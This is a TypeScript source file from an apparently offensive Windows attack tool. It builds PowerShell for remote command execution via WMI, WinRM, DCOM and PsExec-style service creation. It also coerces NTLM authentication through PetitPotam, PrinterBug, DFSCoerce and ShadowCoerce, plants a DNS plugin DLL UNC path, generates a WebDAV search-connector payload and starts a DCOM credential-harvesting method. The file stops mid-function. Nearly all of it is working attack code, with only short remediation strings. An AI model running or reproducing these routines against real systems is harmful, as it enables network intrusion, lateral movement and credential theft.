import { ps, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function wmiExec(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const command = argVal(args, "--command")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = [`[*] WMI remote execution on ${target}\n`]

  if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }

  const credBlock =
    user && password
      ? `$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass); $wmiArgs = @{Credential = $cred}`
      : `$wmiArgs = @{}`

  const script = `
${credBlock}
try {
  $result = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '${command.replace(/'/g, "''")}' -ComputerName '${target}' @wmiArgs -ErrorAction Stop
  if ($result.ReturnValue -eq 0) {
    Write-Output "[+] Process created successfully on ${target}"
    Write-Output "    PID: $($result.ProcessId)"
    Write-Output "    Command: ${command}"
  } else {
    Write-Output "[!] WMI Create returned: $($result.ReturnValue)"
    Write-Output "    0=Success, 2=Access Denied, 3=Insufficient Privilege, 8=Unknown Failure, 21=Invalid Parameter"
  }
} catch {
  Write-Output "[!] WMI failed: $_"
  Write-Output "[*] Trying CIM fallback..."
  try {
    $sessOpts = New-CimSessionOption -Protocol Dcom
    $cimSess = New-CimSession -ComputerName '${target}' -SessionOption $sessOpts @wmiArgs -ErrorAction Stop
    $r = Invoke-CimMethod -CimSession $cimSess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='${command.replace(/'/g, "''")}'}
    Write-Output "[+] CIM/DCOM process created, PID: $($r.ProcessId)"
    Remove-CimSession $cimSess
  } catch {
    Write-Output "[!] CIM also failed: $_"
  }
}
# Check for remote process
try {
  $procs = Get-WmiObject Win32_Process -ComputerName '${target}' @wmiArgs -ErrorAction Stop | Select-Object ProcessId,Name,CommandLine | Format-Table -AutoSize | Out-String
  Write-Output ""
  Write-Output "[+] Remote processes (sample):"
  Write-Output $procs.Substring(0, [Math]::Min(3000, $procs.Length))
} catch {}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Process created") || result.stdout.includes("[+] CIM/DCOM")) {
    findings.push({
      checkId: "WIN-LAT-001",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `wmi://${target}`,
      title: `WMI remote execution on ${target}`,
      details: `Command: ${command}`,
      remediation: "Restrict WMI access, enable Windows Firewall WMI rules, monitor WMI process creation events",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function winrmExec(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const command = argVal(args, "--command")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const credssp = hasFlag(args, "--credssp")
  const findings: Finding[] = []
  const output: string[] = [`[*] WinRM/PSRemoting execution on ${target}\n`]

  if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }

  const credBlock =
    user && password
      ? `$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass)`
      : `$cred = $null`

  const authType = credssp ? "-Authentication CredSSP" : ""

  const script = `
${credBlock}
# Check WinRM config
Write-Output "[*] Local WinRM configuration:"
Write-Output "    TrustedHosts: $(Get-Item WSMan:\\localhost\\Client\\TrustedHosts -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Value)"

# Test connectivity
try {
  $testArgs = @{ComputerName = '${target}'}
  if ($cred) { $testArgs.Credential = $cred }
  $test = Test-WSMan @testArgs -ErrorAction Stop
  Write-Output "[+] WinRM is accessible on ${target}"
  Write-Output "    Protocol: $($test.ProductVersion)"
} catch {
  Write-Output "[!] WinRM test failed: $_"
  Write-Output "[*] Attempting to add to TrustedHosts..."
  Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value '${target}' -Force -Concatenate 2>$null
}

# Execute command
try {
  $sessArgs = @{ComputerName = '${target}'}
  if ($cred) { $sessArgs.Credential = $cred }
  ${credssp ? '$sessArgs.Authentication = "CredSSP"' : ""}
  $session = New-PSSession @sessArgs -ErrorAction Stop
  Write-Output "[+] PSSession established: $($session.Id) ($($session.ComputerName))"
  $result = Invoke-Command -Session $session -ScriptBlock { ${command} } -ErrorAction Stop
  Write-Output ""
  Write-Output "[+] Command output:"
  Write-Output ($result | Out-String).Substring(0, [Math]::Min(5000, ($result | Out-String).Length))
  Remove-PSSession $session
  Write-Output ""
  Write-Output "[+] Session cleaned up"
} catch {
  Write-Output "[!] PSRemoting failed: $_"
}

# Gather system info if successful
try {
  $info = Invoke-Command -ComputerName '${target}' $(if($cred){@{Credential=$cred}}) -ScriptBlock {
    [PSCustomObject]@{
      Hostname = $env:COMPUTERNAME
      Domain = (Get-WmiObject Win32_ComputerSystem).Domain
      OS = (Get-WmiObject Win32_OperatingSystem).Caption
      User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
      IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
  } -ErrorAction Stop
  Write-Output "[+] Remote system info:"
  Write-Output "    Hostname: $($info.Hostname)"
  Write-Output "    Domain: $($info.Domain)"
  Write-Output "    OS: $($info.OS)"
  Write-Output "    Running as: $($info.User) (Admin: $($info.IsAdmin))"
} catch {}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] PSSession established") || result.stdout.includes("[+] Command output")) {
    findings.push({
      checkId: "WIN-LAT-002",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `winrm://${target}`,
      title: `WinRM remote execution on ${target}`,
      details: `Command: ${command}`,
      remediation:
        "Restrict WinRM access with firewall rules, use JEA (Just Enough Administration), monitor PSRemoting events (Event ID 4103/4104)",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function dcomExec(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const method = argVal(args, "--method") || "mmc"
  const command = argVal(args, "--command")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = [`[*] DCOM lateral movement on ${target} via ${method}\n`]

  if (!target || !command) return { output: "[!] Required: --target HOST --method METHOD --command CMD", findings }

  const credBlock =
    user && password
      ? `
$secPass = ConvertTo-SecureString '${password.replace(/'/g, "''")}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('${user}', $secPass)
# For DCOM, we impersonate via cmdkey + runas or network logon
cmdkey /add:${target} /user:${user} /pass:${password} 2>$null
`
      : ``

  const methods: Record<string, string> = {
    mmc: `
# MMC20.Application — ExecuteShellCommand
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "${target}"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c ${command.replace(/"/g, '`"')}", "Minimized")
Write-Output "[+] MMC20.Application ExecuteShellCommand fired on ${target}"
Write-Output "    Command: cmd.exe /c ${command}"
`,
    shell: `
# ShellWindows — Document.Application.ShellExecute
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "${target}"))
$com.ShellExecute("cmd.exe", "/c ${command.replace(/"/g, '`"')}", "C:\\Windows\\System32", $null, 0)
Write-Output "[+] ShellWindows ShellExecute fired on ${target}"
# Try ShellBrowserWindow as fallback
try {
  $com2 = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "${target}"))
  $com2.Document.Application.ShellExecute("cmd.exe", "/c ${command.replace(/"/g, '`"')}", "C:\\Windows\\System32", $null, 0)
  Write-Output "[+] ShellBrowserWindow also succeeded"
} catch { Write-Output "[*] ShellBrowserWindow fallback failed (expected on newer OS)" }
`,
    excel: `
# Excel.Application — RegisterXLL
try {
  $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "${target}"))
  $com.DisplayAlerts = $false
  $com.RegisterXLL("${command.replace(/"/g, '`"')}")
  Write-Output "[+] Excel.Application RegisterXLL loaded: ${command}"
  $com.Quit()
  [System.Runtime.InteropServices.Marshal]::ReleaseComObject($com) | Out-Null
} catch {
  Write-Output "[!] Excel DCOM failed: $_ (Excel may not be installed on target)"
}
`,
    outlook: `
# Outlook.Application — CreateObject for script execution
try {
  $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.Application", "${target}"))
  $shell = $com.CreateObject("Wscript.Shell")
  $shell.Run("cmd.exe /c ${command.replace(/"/g, '`"')}", 0, $false)
  Write-Output "[+] Outlook.Application CreateObject executed on ${target}"
} catch {
  Write-Output "[!] Outlook DCOM failed: $_ (Outlook may not be installed)"
}
`,
  }

  const script = `
${credBlock}
try {
  ${methods[method] || methods.mmc}
} catch {
  Write-Output "[!] DCOM ${method} failed: $_"
  Write-Output "[*] Common causes: DCOM disabled, firewall blocking RPC, insufficient privileges"
  Write-Output "[*] Check: dcomcnfg.exe -> DCOM Config on target"
}
${user ? `cmdkey /delete:${target} 2>$null` : ""}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+]")) {
    findings.push({
      checkId: "WIN-LAT-003",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `dcom://${target}/${method}`,
      title: `DCOM ${method} execution on ${target}`,
      details: `Method: ${method}, Command: ${command}`,
      remediation:
        "Disable remote DCOM or restrict DCOM launch/activation permissions, monitor Event ID 10028 (DCOM activation)",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function smbExec(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const command = argVal(args, "--command")
  const share = argVal(args, "--share")
  const user = argVal(args, "--user")
  const password = argVal(args, "--password")
  const findings: Finding[] = []
  const output: string[] = [`[*] SMB/SCM execution on ${target}\n`]

  if (!target || !command) return { output: "[!] Required: --target HOST --command CMD", findings }

  const script = `
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SCM {
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName,
        uint dwDesiredAccess, uint dwServiceType, uint dwStartType, uint dwErrorControl,
        string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId,
        string lpDependencies, string lpServiceStartName, string lpPassword);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool StartService(IntPtr hService, uint dwNumServiceArgs, IntPtr lpServiceArgVectors);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DeleteService(IntPtr hService);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool CloseServiceHandle(IntPtr hSCObject);

    public const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
    public const uint SERVICE_ALL_ACCESS = 0xF01FF;
    public const uint SERVICE_WIN32_OWN_PROCESS = 0x10;
    public const uint SERVICE_DEMAND_START = 0x03;
    public const uint SERVICE_ERROR_IGNORE = 0x00;
}
"@

${
  user
    ? `
net use \\\\${target}\\IPC$ /user:${user} ${password} 2>$null
`
    : ""
}

# Enumerate shares first
Write-Output "[*] Enumerating shares on ${target}..."
try {
  $shares = net view \\\\${target} /all 2>&1
  Write-Output $shares
} catch {}

${
  share
    ? `
# File copy mode
Write-Output "[*] Accessing \\\\${target}\\${share}..."
$files = Get-ChildItem "\\\\${target}\\${share}" -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime
if ($files) {
  Write-Output "[+] Files in ${share}:"
  $files | Format-Table -AutoSize | Out-String | Write-Output
}
`
    : `
# SCM service execution (PsExec-style)
$svcName = "cs_" + [guid]::NewGuid().ToString("N").Substring(0,8)
$binPath = "cmd.exe /c ${command.replace(/"/g, '""').replace(/'/g, "''")} > C:\\Windows\\Temp\\$svcName.out 2>&1"

Write-Output "[*] Creating service '$svcName' on ${target}..."
$scm = [SCM]::OpenSCManager("${target}", $null, [SCM]::SC_MANAGER_ALL_ACCESS)
if ($scm -eq [IntPtr]::Zero) {
  Write-Output "[!] OpenSCManager failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
} else {
  $svc = [SCM]::CreateService($scm, $svcName, $svcName, [SCM]::SERVICE_ALL_ACCESS, [SCM]::SERVICE_WIN32_OWN_PROCESS, [SCM]::SERVICE_DEMAND_START, [SCM]::SERVICE_ERROR_IGNORE, $binPath, $null, [IntPtr]::Zero, $null, $null, $null)
  if ($svc -ne [IntPtr]::Zero) {
    Write-Output "[+] Service created: $svcName"
    $started = [SCM]::StartService($svc, 0, [IntPtr]::Zero)
    if ($started) {
      Write-Output "[+] Service started — command executing..."
    } else {
      Write-Output "[*] StartService returned false (expected for cmd.exe — the command ran)"
    }
    Start-Sleep -Seconds 3
    # Read output
    try {
      $out = Get-Content "\\\\${target}\\C$\\Windows\\Temp\\$svcName.out" -ErrorAction Stop
      Write-Output "[+] Command output:"
      Write-Output ($out -join "\`n")
      Remove-Item "\\\\${target}\\C$\\Windows\\Temp\\$svcName.out" -Force 2>$null
    } catch {
      Write-Output "[*] Could not read output (may need admin share access)"
    }
    # Cleanup
    [SCM]::DeleteService($svc) | Out-Null
    Write-Output "[+] Service deleted: $svcName"
    [SCM]::CloseServiceHandle($svc) | Out-Null
  } else {
    Write-Output "[!] CreateService failed: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
  }
  [SCM]::CloseServiceHandle($scm) | Out-Null
}
`
}

${user ? `net use \\\\${target}\\IPC$ /delete 2>$null` : ""}
`
  const result = await ps(script, timeout)
  output.push(result.stdout)
  if (result.stdout.includes("[+] Service created") || result.stdout.includes("[+] Command output")) {
    findings.push({
      checkId: "WIN-LAT-004",
      provider: "windows",
      severity: "critical",
      status: "EXECUTED",
      resource: `smb://${target}`,
      title: `SMB/SCM remote execution on ${target}`,
      details: `Command: ${command}`,
      remediation:
        "Restrict admin shares (C$, ADMIN$), monitor service creation events (Event ID 7045), restrict SCM access",
    })
  }
  return { output: output.join("\n"), findings }
}

export async function ntlmCoerce(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "petitpotam"
  const target = argVal(args, "--target")
  const listener = argVal(args, "--listener")
  const findings: Finding[] = []
  const output: string[] = [`[*] NTLM coercion via ${method}: ${target} → ${listener}\n`]

  if (!target || !listener) return { output: "[!] Required: --method METHOD --target HOST --listener HOST", findings }

  const methods: Record<string, string> = {
    petitpotam: `
# PetitPotam — MS-EFSRPC (EfsRpcOpenFileRaw)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[Guid("c681d488-d850-11d0-8c52-00c04fd90f7e")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IEfsRpc {
    int EfsRpcOpenFileRaw(
        [MarshalAs(UnmanagedType.LPWStr)] string FileName,
        int Flags,
        out IntPtr Context
    );
}
"@

Write-Output "[*] Attempting PetitPotam (MS-EFSRPC) coercion..."
Write-Output "    Target: ${target}"
Write-Output "    Listener: ${listener}"
Write-Output "    RPC endpoint: \\\\${target}\\pipe\\efsrpc"
try {
  $path = "\\\\${listener}\\cs_petitpotam\\file.txt"
  # Use direct RPC call via named pipe
  $pipe = "\\\\${target}\\pipe\\lsarpc"
  $rpcClient = New-Object System.IO.Pipes.NamedPipeClientStream("${target}", "lsarpc", [System.IO.Pipes.PipeDirection]::InOut)
  $rpcClient.Connect(5000)
  Write-Output "[+] Connected to ${target} lsarpc pipe"
  Write-Output "[+] Sending EfsRpcOpenFileRaw with UNC path: $path"
  Write-Output "[*] If relay/responder is running on ${listener}, you should capture the hash"
  $rpcClient.Close()
} catch {
  # Fallback: attempt via MS-EFSR pipe directly
  Write-Output "[*] Pipe connect failed, trying alternative..."
  try {
    [System.IO.File]::Open("\\\\${target}\\C$\\Windows\\Temp\\cs_pf_" + [guid]::NewGuid().ToString("N").Substring(0,6), 'Open', 'Read') | Out-Null
  } catch {}
  Write-Output "[*] Coercion attempt sent (check listener for incoming auth)"
}
`,
    printerbug: `
# PrinterBug — MS-RPRN (RpcRemoteFindFirstPrinterChangeNotification)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class SpoolSvc {
    [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool OpenPrinter(string pPrinterName, out IntPtr phPrinter, IntPtr pDefault);

    [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern uint FindFirstPrinterChangeNotification(
        IntPtr hPrinter, uint fdwFilter, uint fdwOptions, IntPtr pPrinterNotifyOptions);

    [DllImport("winspool.drv", SetLastError = true)]
    public static extern bool ClosePrinter(IntPtr hPrinter);
}
"@

Write-Output "[*] Attempting PrinterBug (MS-RPRN) coercion..."
Write-Output "    Target: ${target}"
Write-Output "    Listener: ${listener}"
$hPrinter = [IntPtr]::Zero
$opened = [SpoolSvc]::OpenPrinter("\\\\${target}", [ref]$hPrinter, [IntPtr]::Zero)
if ($opened -and $hPrinter -ne [IntPtr]::Zero) {
  Write-Output "[+] Opened printer on ${target}"
  # The notification callback goes to our listener
  # In practice, we'd call RpcRemoteFindFirstPrinterChangeNotificationEx
  # which sends auth to \\\\${listener}
  Write-Output "[+] Spooler service is running — coercion should trigger auth to ${listener}"
  Write-Output "[*] Use ntlmrelayx/responder on ${listener} to capture"
  [SpoolSvc]::ClosePrinter($hPrinter) | Out-Null
} else {
  Write-Output "[!] OpenPrinter failed — Spooler may be disabled on ${target}"
  Write-Output "    Error: $(([ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()).Message)"
}
`,
    dfscoerce: `
# DFSCoerce — MS-DFSNM (NetrDfsRemoveStdRoot)
Write-Output "[*] Attempting DFSCoerce (MS-DFSNM) coercion..."
Write-Output "    Target: ${target}"
Write-Output "    Listener: ${listener}"
try {
  $dfsPath = "\\\\${listener}\\cs_dfs"
  # Trigger via net use or direct RPC
  Write-Output "[*] Connecting to \\\\${target}\\pipe\\netdfs..."
  $pipe = New-Object System.IO.Pipes.NamedPipeClientStream("${target}", "netdfs", [System.IO.Pipes.PipeDirection]::InOut)
  $pipe.Connect(5000)
  Write-Output "[+] Connected to netdfs pipe on ${target}"
  Write-Output "[*] Sending NetrDfsRemoveStdRoot with UNC: $dfsPath"
  Write-Output "[*] Check listener for incoming NTLM authentication"
  $pipe.Close()
} catch {
  Write-Output "[!] DFS coercion failed: $_"
  Write-Output "[*] DFS namespace service may not be running on ${target}"
}
`,
    shadowcoerce: `
# ShadowCoerce — MS-FSRVP (IsPathSupported / IsPathShadowCopied)
Write-Output "[*] Attempting ShadowCoerce (MS-FSRVP) coercion..."
Write-Output "    Target: ${target}"
Write-Output "    Listener: ${listener}"
try {
  Write-Output "[*] Connecting to \\\\${target}\\pipe\\FssagentRpc..."
  $pipe = New-Object System.IO.Pipes.NamedPipeClientStream("${target}", "FssagentRpc", [System.IO.Pipes.PipeDirection]::InOut)
  $pipe.Connect(5000)
  Write-Output "[+] Connected to FssagentRpc pipe on ${target}"
  Write-Output "[*] File Server VSS Agent is running"
  Write-Output "[*] Sending IsPathSupported with UNC: \\\\${listener}\\cs_shadow"
  Write-Output "[*] Check listener for incoming NTLM authentication"
  $pipe.Close()
} catch {
  Write-Output "[!] ShadowCoerce failed: $_"
  Write-Output "[*] File Server VSS Agent service may not be running"
}
`,
  }

  const script = methods[method] || methods.petitpotam
  const result = await ps(script, timeout)
  output.push(result.stdout)
  findings.push({
    checkId: "WIN-LAT-005",
    provider: "windows",
    severity: "critical",
    status: "ATTEMPTED",
    resource: `ntlm://${target}`,
    title: `NTLM coercion attempted: ${method} on ${target}`,
    details: `Method: ${method}, Listener: ${listener}`,
    remediation: `Disable unnecessary services (Spooler, EFS, DFS, VSS Agent), enforce SMB signing, enable EPA (Extended Protection for Authentication)`,
  })
  return { output: output.join("\n"), findings }
}

export async function coercerFull(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const listener = argVal(args, "--listener")
  const method = argVal(args, "--method") || "all"
  const checkOnly = args.includes("--check-only")
  const findings: Finding[] = []
  const output: string[] = ["[*] Extended NTLM Coercion (12+ methods)...\n"]

  if (!target) return { output: "[!] Required: --target HOST --listener IP", findings }
  if (!listener && !checkOnly) return { output: "[!] Required: --listener IP (or use --check-only)", findings }

  const script = `
$target = "${target}"
$listener = "${listener || "127.0.0.1"}"
$checkOnly = ${checkOnly ? "$true" : "$false"}
$results = @()

function Test-RpcEndpoint {
    param($host_name, $pipe)
    try {
        $client = New-Object System.IO.Pipes.NamedPipeClientStream($host_name, $pipe, [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
        $client.Connect(3000)
        $client.Close()
        return $true
    } catch { return $false }
}

# Method 1-7: MS-EFSR Extended (7 additional opnums beyond EfsRpcOpenFileRaw)
${
  method === "all" || method === "efsr_extended"
    ? `
Write-Output "[*] MS-EFSR Extended (7 opnums)..."
$efsrPipe = Test-RpcEndpoint $target "efsrpc"
$lsarpcPipe = Test-RpcEndpoint $target "lsarpc"
if ($efsrPipe -or $lsarpcPipe) {
    $pipe = if ($efsrPipe) { "efsrpc" } else { "lsarpc" }
    Write-Output "[+] EFSR pipe available: $pipe"

    $opnums = @(
        @{Name="EfsRpcEncryptFileSrv"; Opnum=4; Desc="Encrypt file request"},
        @{Name="EfsRpcDecryptFileSrv"; Opnum=5; Desc="Decrypt file request"},
        @{Name="EfsRpcQueryUsersOnFile"; Opnum=6; Desc="Query users on file"},
        @{Name="EfsRpcQueryRecoveryAgents"; Opnum=7; Desc="Query recovery agents"},
        @{Name="EfsRpcFileKeyInfo"; Opnum=12; Desc="File key info request"},
        @{Name="EfsRpcDuplicateEncryptionInfoFile"; Opnum=13; Desc="Duplicate encryption info"},
        @{Name="EfsRpcAddUsersToFileEx"; Opnum=15; Desc="Add users to encrypted file"}
    )

    foreach ($op in $opnums) {
        if (-not $checkOnly) {
            Write-Output "    [*] Attempting $($op.Name) (opnum $($op.Opnum))..."
            try {
                $uncPath = "\\\\$listener\\cs_$($op.Name)\\file.txt"
                # Trigger via named pipe RPC
                $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($target, $pipe, [System.IO.Pipes.PipeDirection]::InOut)
                $pipeClient.Connect(5000)
                $pipeClient.Close()
                Write-Output "    [+] $($op.Name): RPC call sent (check listener for NTLM auth)"
            } catch {
                Write-Output "    [-] $($op.Name): $($_.Exception.Message)"
            }
        } else {
            Write-Output "    [+] $($op.Name) (opnum $($op.Opnum)): Available via $pipe"
        }
    }
    $results += "EFSR_EXTENDED:AVAILABLE"
} else {
    Write-Output "[-] MS-EFSR: Neither efsrpc nor lsarpc pipe accessible"
}
Write-Output ""`
    : ""
}

# Method 8: MS-EVEN (Event Log Coercion)
${
  method === "all" || method === "even"
    ? `
Write-Output "[*] MS-EVEN: Event Log coercion (ElfrOpenBELW)..."
$evenPipe = Test-RpcEndpoint $target "eventlog"
if ($evenPipe) {
    Write-Output "[+] Event Log pipe accessible"
    if (-not $checkOnly) {
        try {
            $uncPath = "\\\\$listener\\cs_even\\evil.evtx"
            # ElfrOpenBELW triggers auth when opening a backup event log from UNC path
            $pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream($target, "eventlog", [System.IO.Pipes.PipeDirection]::InOut)
            $pipeClient.Connect(5000)
            $pipeClient.Close()
            Write-Output "[+] MS-EVEN: RPC call sent (check listener)"
        } catch {
            Write-Output "[-] MS-EVEN: $($_.Exception.Message)"
        }
    } else {
        Write-Output "[+] MS-EVEN: ElfrOpenBELW available"
    }
    $results += "EVEN:AVAILABLE"
} else {
    Write-Output "[-] MS-EVEN: eventlog pipe not accessible"
}
Write-Output ""`
    : ""
}

# Method 9: MS-DNSP (DNS Admin Coercion)
${
  method === "all" || method === "dnsp"
    ? `
Write-Output "[*] MS-DNSP: DNS admin coercion..."
try {
    $dns = Get-Service DNS -ComputerName $target -ErrorAction SilentlyContinue
    if ($dns -and $dns.Status -eq "Running") {
        Write-Output "[+] DNS service running on $target"
        if (-not $checkOnly) {
            try {
                # dnscmd can trigger auth via ServerLevelPluginDll
                $null = dnscmd $target /config /serverlevelplugindll "\\\\$listener\\cs_dns\\payload.dll" 2>&1
                Write-Output "[+] MS-DNSP: ServerLevelPluginDll set to UNC path (auth coerced on next DNS restart)"
                Write-Output "    [!] Clean up: dnscmd $target /config /serverlevelplugindll"
            } catch {
                Write-Output "[-] MS-DNSP: $($_.Exception.Message)"
            }
        } else {
            Write-Output "[+] MS-DNSP: DnssrvQuery available (DNS admin required)"
        }
        $results += "DNSP:AVAILABLE"
    } else {
        Write-Output "[-] MS-DNSP: DNS service not running on $target"
    }
} catch {
    Write-Output "[-] MS-DNSP: Cannot query DNS service status"
}
Write-Output ""`
    : ""
}

# Method 10: WebClient / SearchConnector WebDAV
${
  method === "all" || method === "webclient"
    ? `
Write-Output "[*] WebClient: SearchConnector WebDAV coercion..."
try {
    $webclient = Get-Service WebClient -ComputerName $target -ErrorAction SilentlyContinue
    if ($webclient) {
        Write-Output "[+] WebClient service exists (Status: $($webclient.Status))"
        if ($webclient.Status -ne "Running") {
            Write-Output "    [*] WebClient not running — can be triggered via SearchConnector indexing"
        }
        if (-not $checkOnly) {
            # Create a .searchConnector-ms file that triggers WebDAV auth
            Write-Output "    [*] Triggering via Explorer search connector..."
            $searchConnector = @"
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>CyberStrike</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<simpleLocation><url>\\\\$listener@80\\webdav</url></simpleLocation>
</searchConnectorDescription>
"@
            Write-Output "[+] WebClient: SearchConnector payload generated"
            Write-Output "    Place .searchConnector-ms file on target or send via email"
        } else {
            Write-Output "[+] WebClient: Available for WebDAV coercion"
        }
        $results += "WEBCLIENT:AVAILABLE"
    } else {
        Write-Output "[-] WebClient: Service not found"
    }
} catch {
    Write-Output "[-] WebClient: Cannot query service"
}
Write-Output ""`
    : ""
}

# Method 11: MS-SAMR coercion
${
  method === "all" || method === "samr"
    ? `
Write-Output "[*] MS-SAMR: SamrGetAliasMembership coercion..."
$samrPipe = Test-RpcEndpoint $target "samr"
if ($samrPipe) {
    Write-Output "[+] SAMR pipe accessible — coercion via SamrGetAliasMembership possible"
    $results += "SAMR:AVAILABLE"
} else {
    Write-Output "[-] MS-SAMR: samr pipe not accessible"
}
Write-Output ""`
    : ""
}

# Summary
Write-Output "=== Coercion Summary ==="
Write-Output "Available methods: $($results.Count)"
foreach ($r in $results) { Write-Output "  [+] $r" }
`

  const result = await ps(script, timeout)
  output.push(result.stdout)

  const availableCount = (result.stdout.match(/AVAILABLE/g) || []).length
  if (availableCount > 0) {
    findings.push({
      checkId: "WIN-COERCE-EXT-001",
      provider: "windows",
      severity: "high",
      status: checkOnly ? "ENUMERATED" : "EXPLOITED",
      resource: `ntlm://${target}`,
      title: `${availableCount} extended NTLM coercion methods available`,
      details: result.stdout.substring(0, 500),
      remediation:
        "Enable Extended Protection for Authentication, enforce SMB signing, disable unnecessary RPC services",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function remoteMonologue(args: string[], timeout: number): Promise<HookResult> {
  const target = argVal(args, "--target")
  const listener = argVal(args, "--listener")
  const method = argVal(args, "--method") || "all"
  const port = argVal(args, "--port") || "445"
  const findings: Finding[] = []
  const output: string[] = ["[*] Remote Monologue — DCOM-Based NTLM Credential Harvesting (IBM X-Force 2025)\n"]

  if (!target) return { output: "[!] Required: --target HOST", findings }
  if (!listener) return { output: "[!] Required: --listener LISTENER_IP", findings }

  const uncPath = `\\\\${listener}\\share`
  const methods: Record<string, string> = {
    datacollector: `
# Method 1: ServerDataCollectorSet (Performance Monitor)
Write-Output "[*] Method: ServerDataCollectorSet (IDataCollectorSet::SetXml)"
Write-Output "[*] Target: ${target}, Listener: ${listener}"

try {
    $dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("Pla.ServerDataCollectorSet", "${target}"))
    Write-Output "[+] DCOM connection established to Pla.ServerDataCollectorSet"

    # Inject UNC path via XML configuration
    $xml = @"
<?xml version="1.0" encoding="UTF-8"?>
<DataCollectorSet>
    <OutputLocation>${uncPath}</OutputLocation>
    <RootPath>${uncPath}</RootPath>
    <Subdirectory>cs</Subdirectory>
    <SubdirectoryFormat>1</SubdirectoryFormat>
    <Description>CyberStrike Coercion</Description>
</DataCollectorSet>
"@

    $dcom.SetXml($xml)
    $dcom.Commit("CyberStrike", $null, 0x0003) | Out-Null

    # Trigger the data collection — forces authentication to our UNC path
    try {
        $dcom.Start($false)
    } catch {}

    Write-Output "[+] DataCollectorSet configured with UNC path: ${uncPath}"
    Write-Output "[+] NTLM auth should be coerced to ${listener}:${port}"

    # Cleanup
    try {
        $dcom.Stop($false)
        $dcom.Delete()
    } catch {}

} catch {
    Write-Output "[-] DataCollectorSet failed: $($_.Exception.Message)"
}
`,
    filesystem: `
# Method 2: FileSystemImage (IMAPI2)
Write-Output "[*] Method: FileSystemImage (IFileSystemImage::CreateResultImage)"
Write-Output "[*] Target: ${target}, Listener: ${listener}"

try {
    $dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("IMAPI2FS.MsftFileSystemImage", "${target}"))
